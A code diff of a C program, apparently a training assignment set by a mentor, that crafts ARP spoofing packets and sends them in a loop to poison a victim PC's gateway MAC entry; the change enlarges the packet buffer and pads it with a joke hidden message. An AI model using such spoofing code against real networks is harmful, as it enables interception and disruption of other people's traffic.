@@ -402,7 +402,7 @@ int main(int argc, char* argv[]) {
 
 	// SCENARIO #3 :  ARP Spoofing을 통한 Victim_PC의 ARP Infection
 	printf("===========SCENARIO #3 :  ARP Spoofing을 통한 Victim_PC의 ARP Infection===========\n");
-	char infection_packet[42];
+	char infection_packet[100];
 
 	for(int i=0; i<6; i++){
 		infection_packet[i] = param_set.Victim_MAC[i];
@@ -498,6 +498,12 @@ int main(int argc, char* argv[]) {
 		infection_packet[i+38] = param_set.Victim_IP[i];
 
 	}
+	
+	char * hidden_msg = "It's not my fault. I've just completed GilGil's quest";
+	
+	for(int i=0; i<53; i++){
+		infection_packet[i+42] = hidden_msg[i];
+	}	
 
 	/*
 	infection_packet[38] = 0xc0;
@@ -510,8 +516,7 @@ int main(int argc, char* argv[]) {
 	while(1) {
 		sleep(1);
 		printf("-> Victim의 Gateway MAC Address를 변조중입니다...\n");
-		printf("-> 이건 모두 다 길길 멘토님께서 시키신 공격입니다. 전 아무 잘못없어요 '_' \n");
-		if(pcap_sendpacket(handle, (const u_char *)infection_packet, 42) != 0){
+		if(pcap_sendpacket(handle, (const u_char *)infection_packet, 100) != 0){
 			printf("\nError sending the packet: \n");
 			return 1;
 		}
